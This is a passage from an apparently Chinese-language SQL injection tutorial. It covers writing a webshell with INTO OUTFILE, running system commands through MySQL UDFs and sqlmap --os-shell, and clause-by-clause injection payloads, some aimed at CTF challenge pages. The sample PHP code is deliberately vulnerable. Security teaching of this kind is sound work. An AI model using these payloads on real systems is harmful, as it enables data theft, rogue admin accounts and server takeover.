+</span><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s1">&#39;C:/wamp64/www/work/webshell.php&#39;</span><span class="w"> </span><span class="n">lines</span><span class="w"> </span><span class="n">terminated</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="s1">&#39;&lt;?php phpinfo() ?&gt;&#39;</span><span class="p">;</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="n">lines</span><span class="w"> </span><span class="n">starting</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="err">写入</span><span class="w">
+</span><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s1">&#39;C:/wamp64/www/work/webshell.php&#39;</span><span class="w"> </span><span class="n">lines</span><span class="w"> </span><span class="n">starting</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="s1">&#39;&lt;?php phpinfo() ?&gt;&#39;</span><span class="p">;</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="n">fields</span><span class="w"> </span><span class="n">terminated</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="err">写入</span><span class="w">
+</span><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s1">&#39;C:/wamp64/www/work/webshell.php&#39;</span><span class="w"> </span><span class="n">fields</span><span class="w"> </span><span class="n">terminated</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="s1">&#39;&lt;?php phpinfo() ?&gt;&#39;</span><span class="p">;</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="n">COLUMNS</span><span class="w"> </span><span class="n">terminated</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="err">写入</span><span class="w">
+</span><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s1">&#39;C:/wamp64/www/work/webshell.php&#39;</span><span class="w"> </span><span class="n">COLUMNS</span><span class="w"> </span><span class="n">terminated</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="s1">&#39;&lt;?php phpinfo() ?&gt;&#39;</span><span class="p">;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h3 id="122-用户自定义函数---udf">12.2 用户自定义函数 - UDF</h3>
+<p>还可以利用「用户自定义函数」的方式，即 User Defined Functions(UDF) 来执行命令。通过 lib_mysqludf_sys 提供的函数可以执行<strong>系统命令</strong>关键语句:</p>
+<ul>
+<li>
+<p><strong>sys_eval()</strong>，执行任意命令，并将输出返回</p>
+</li>
+<li>
+<p>sys_exec()，执行任意命令，并将返回码返回</p>
+</li>
+<li>
+<p>sys_get()，获取一个环节变量</p>
+</li>
+<li>
+<p>sys_set()，创建或修改一个环境变量</p>
+</li>
+</ul>
+<h4 id="1221-udf-库文件获取">12.2.1 UDF 库文件获取</h4>
+<p><a href="https://github.com/mysqludf/lib_mysqludf_sys" target="_blank" rel="noopener noreffer">https://github.com/mysqludf/lib_mysqludf_sys</a></p>
+<p>sqlmap/data/udf/mysql/</p>
+<p>sqlmap 下的文件经过编码，需要使用 sqlmap/extra/cloak 目录下的 cloak.py 文件进行解码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 解码文件</span>
+python cloak.py -d -i /path/to/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_linux.so
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="1222-udf-库文件写入">12.2.2 UDF 库文件写入</h4>
+<p>将 so 文件转成 16 进制，以 16 进制编码形式写入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="n">unhex</span><span class="p">(</span><span class="s1">&#39;???&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">dumpfile</span><span class="w"> </span><span class="s1">&#39;/usr/lib/mysql/plugin/lib_linux.so&#39;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h4 id="1223-dumpfile-vs-outfile">12.2.3 dumpfile vs. outfile</h4>
+<p>若我们想把一个可执行 2 进制文件用 into outfile 函数导出事实上导出后就会被破坏。</p>
+<p>因为 into outfile 函数会在行末端写入新行，更致命的是会转义换行符，这样的话这个 2 进制可执行文件就会被破坏。</p>
+<p>这时候我们用 into dumpfile 就能导出一个完整能执行的 2 进制文件 into dumpfile 函数不对任何列或行进行终止，也不执行任何转义处理。</p>
+<h4 id="1224-自定义函数">12.2.4 自定义函数</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">create</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">sys_eval</span><span class="w"> </span><span class="k">returns</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="n">soname</span><span class="w"> </span><span class="s2">&#34;lib_linux.so&#34;</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">sys_eval</span><span class="p">(</span><span class="s1">&#39;ifconfig&#39;</span><span class="p">);</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h3 id="123-自动化工具">12.3 自动化工具</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sqlmap -u <span class="s2">&#34;url&#34;</span> --os-shell
+sqlmap -u <span class="s2">&#34;url&#34;</span> --os-cmd<span class="o">=</span>ifconfig
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="13-注入技巧">13 注入技巧</h2>
+<p>从 SQL 语法角度，从不同的注入点位置说明 SQL 注入的技巧</p>
+<h3 id="131-select-注入">13.1 SELECT 注入</h3>
+<blockquote>
+<p>select 语句用于数据表记录的查询，常在界面展示的过程中使用</p>
+</blockquote>
+<h4 id="1311-注入点在-select_expr">13.1.1 注入点在 select_expr</h4>
+<p>源代码如下所示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+    <span class="nv">$conn</span> <span class="o">=</span> <span class="nx">mysqli_connect</span><span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span>
+	<span class="nv">$res</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="s2">&#34;SELECT </span><span class="si">${</span><span class="nv">_GET[&#39;id&#39;]</span><span class="si">}</span><span class="s2">, content FROM wp_news&#34;</span><span class="p">);</span>
+	<span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
+	<span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$row[&#39;title&#39;]</span><span class="s2">&#34;</span><span class="p">;</span>
+	<span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$row[&#39;content&#39;]</span><span class="s2">&#34;</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>可以采取时间盲注的方式，但是根据 MySQL 的语法，有更优的解决方法，即利用 AS 别名的方法，直接将查询的结果显示到界面中。</p>
+<p><strong>payload</strong>：<code>?id=(select pwd from wp_user as title)</code></p>
+<h4 id="1312-注入点在-table_reference">13.1.2 注入点在 table_reference</h4>
+<p>上文的 SQL 查询语句改为：<code>$res = mysqli_query($conn, &quot;SELECT title FROM ${_GET['table']}&quot;);</code></p>
+<p>仍然可以利用别名的方式直接取出数据</p>
+<p><code>select title from (select pwd AS title from wp_user)x</code></p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>技巧<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>在不知表名的情况下，可以先从 information_schema.tables 中查询表名。</p>
+<p>在 select_expr 和 table_reference 的注入，如果注入的点有反引号包裹，那么需要先闭合反引号。</p>
+</div>
+        </div>
+    </div>
+<h4 id="1313-注入点在-where-或-having-后">13.1.3 注入点在 WHERE 或 HAVING 后</h4>
+<p>SQL 语句：<code>$res = mysqli_query($conn, &quot;SELECT title FROM wp_news WHERE id=${_GET[id]}&quot;)</code></p>
+<p>实战中最常遇到的情况，要先判断有无引号包裹，再闭合前面可能存在的括号，即可进行注入来获取数据。注入点在 HAVING 后的情况与之相似。</p>
+<h4 id="1314-注入点在-group-by-或-order-by-后">13.1.4 注入点在 GROUP BY 或 ORDER BY 后</h4>
+<h5 id="13141-利用报错">13.1.4.1 利用报错</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">1</span><span class="o">|</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">0</span><span class="p">)</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>1105 - XPATH syntax error: &lsquo;~sectest~&rsquo;, Time: 0.000000s</p>
+<h5 id="13142-利用延时">13.1.4.2 利用延时</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="err">$</span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mysqli_query</span><span class="p">(</span><span class="err">$</span><span class="n">conn</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;SELECT title FROM wp_news GROUP BY ${_GET[&#39;title&#39;]}&#34;</span><span class="p">);</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>经过测试可以发现，<code>?title=id desc,(if(1，sleep(1),1))</code> 会让页面迟 1 秒，于是可以利用时间注入获取相关数据。</p>
+<div class="details admonition warning open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-exclamation-triangle fa-fw"></i>警告<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">该方法只能用在 mysql 5 上，mysql 8 上失效。</div>
+        </div>
+    </div>
+<h5 id="13143-利用----位运算符进行-order-by">13.1.4.3 利用 &amp; | ^ 位运算符进行 order by</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">//</span><span class="w"> </span><span class="err">布尔型盲注</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="o">|</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="n">id</span><span class="w"> </span><span class="err">和</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="err">返回的结果进行按位与进行</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="err">根据时间判断</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">1</span><span class="o">|</span><span class="k">if</span><span class="p">(</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="n">regexp</span><span class="w"> </span><span class="s2">&#34;sectest&#34;</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="p">)</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h5 id="13144-利用括号闭合进行联合查询">13.1.4.4 利用括号闭合进行联合查询</h5>
+<p>前提是前句查询必须带有括号。</p>
+<p><code>(select * from person order by 1) union (select 1,2,3)</code></p>
+<p><strong>Demo</strong></p>
+<p><a href="https://chall.tasteless.eu/level1/index.php?dir=asc" target="_blank" rel="noopener noreffer">https://chall.tasteless.eu/level1/index.php?dir=asc</a></p>
+<p>payload: <code>?dir=,3)union(select%201,flag%20from%20level1_flag)%23</code></p>
+<h4 id="1315-注入点在-limit-后">13.1.5 注入点在 LIMIT 后</h4>
+<p>LIMIT 后的注入判断比较简单，通过更改数字大小，页面会显示更多或者更少的记录数。由于语法限制，前面的字符注入方式不可行（LIMIT 后只能是数字），在整个 SQL 语句没有 ORDER BY 关键字的情况下，可以直接使用 UNION 注入。</p>
+<p>另外，可根据 SELECT 语法，通过加入 PROCEDURE 来尝试注入，这类语句只适合 MySQL 5.6 前的版本，</p>
+<p><code>select id from wp_news limit 2 procedure analyse(extractvalue(1,concat(0x7e,version())),1)</code></p>
+<p>也可以进行时间盲注</p>
+<p><code>procedure analyse((select extractvalue(1,concat(0x3a,(if(mid(version(),1,1) LIKE 5, BENCHMARK(500000, SHA(1)), 1))))),1)</code></p>
+<p>也可以直接写文件 <code>into outfile</code></p>
+<h3 id="132-insert-注入">13.2 INSERT 注入</h3>
+<p>通常，注入位于字段名或者字段值的地方，且没有回显信息</p>
+<h4 id="1321-注入点位于-tbl_name">13.2.1 注入点位于 tbl_name</h4>
+<p>如果能够通过注释符注释后续语句，则可直接插入特定数据到想要的表内，如管理员表。例如，对于如下 SQL 语句：</p>
+<p><code>$res = mysqli_query($conn, &quot;INSERT INTO {$_GET['table']} VALUES(2,2,2,2)&quot;);</code></p>
+<p>开发者预想的是，控制 table 的值为 wp_news，从而插入新闻表数据。由于可以控制表名，可以访问 <code>?table=wp_user values(2，'newadmin'，'newpass')%23</code>，直接插入管理员。</p>
+<h4 id="1322-注入点位于-values">13.2.2 注入点位于 VALUES</h4>
+<h5 id="13221-insert-延时">13.2.2.1 INSERT 延时</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">INSERT</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="k">year</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="p">(</span><span class="s2">&#34;test1&#34;</span><span class="p">,</span><span class="s2">&#34;122&#34;</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">INSERT</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="k">year</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="p">(</span><span class="s2">&#34;test1&#34;</span><span class="p">,</span><span class="s2">&#34;122&#34;</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">INSERT</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="k">year</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="p">(</span><span class="s2">&#34;test1&#34;</span><span class="p">,</span><span class="s2">&#34;122&#34;</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h5 id="13222-insert-报错">13.2.2.2 INSERT 报错</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">INSERT</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="k">year</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="p">(</span><span class="s2">&#34;test1&#34;</span><span class="p">,</span><span class="s2">&#34;122&#34;</span><span class="k">or</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">DATABASE</span><span class="p">()),</span><span class="mi">0</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">INSERT</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="k">year</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="p">(</span><span class="s2">&#34;test1&#34;</span><span class="p">,</span><span class="s2">&#34;122&#34;</span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">DATABASE</span><span class="p">()),</span><span class="mi">0</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">INSERT</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="k">year</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="p">(</span><span class="s2">&#34;test1&#34;</span><span class="p">,</span><span class="s2">&#34;122&#34;</span><span class="o">&amp;</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">DATABASE</span><span class="p">()),</span><span class="mi">0</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">INSERT</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="k">year</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="p">(</span><span class="s2">&#34;test1&#34;</span><span class="p">,</span><span class="s2">&#34;122&#34;</span><span class="o">|</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">DATABASE</span><span class="p">()),</span><span class="mi">0</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">INSERT</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="k">year</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="p">(</span><span class="s2">&#34;test1&#34;</span><span class="p">,</span><span class="s2">&#34;122&#34;</span><span class="o">+</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">DATABASE</span><span class="p">()),</span><span class="mi">0</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>result: 1105 - XPATH syntax error: &lsquo;~sectest&rsquo;, Time: 0.000000s</p>
+<p><strong>Demo</strong></p>
+<p><a href="http://chall.tasteless.eu/level15/" target="_blank" rel="noopener noreffer">http://chall.tasteless.eu/level15/</a></p>
+<p>payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">tables</span><span class="w"> </span><span class="k">values</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;\&#39;</span><span class="p">,</span><span class="s1">&#39;,(select flag from level15_flag))# &#39;</span><span class="p">)</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>name: <code>\</code></li>
+<li>text: <code>,(select flag from level15_flag))#</code></li>
+</ul>
+<h3 id="133-update-注入">13.3 UPDATE 注入</h3>
+<h4 id="1331-update-报错">13.3.1 UPDATE 报错</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">update</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s2">&#34;zxczxcxzc&#34;</span><span class="k">or</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">9</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">update</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s2">&#34;zxczxcxzc&#34;</span><span class="k">or</span><span class="p">(</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">9</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h4 id="1332-update-延时">13.3.2 UPDATE 延时</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">update</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s2">&#34;2&#34;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">9</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">update</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s2">&#34;00000000&#34;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">((</span><span class="k">LENGTH</span><span class="p">(</span><span class="k">database</span><span class="p">())</span><span class="o">=</span><span class="mi">8</span><span class="p">),</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">9</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="n">password处必须为数字型</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h3 id="134-delete-注入">13.4 DELETE 注入</h3>
+<h4 id="1341-delete-延时">13.4.1 DELETE 延时</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">delete</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">21</span><span class="w"> </span><span class="k">or</span><span class="o">/</span><span class="k">and</span><span class="p">(</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">delete</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_user_</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">21</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">((</span><span class="k">LENGTH</span><span class="p">(</span><span class="k">database</span><span class="p">()</span><span class="o">=</span><span class="mi">7</span><span class="p">)),</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span><span class="mi">0</span><span class="p">)</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h4 id="1342-delete-报错">13.4.2 DELETE 报错</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
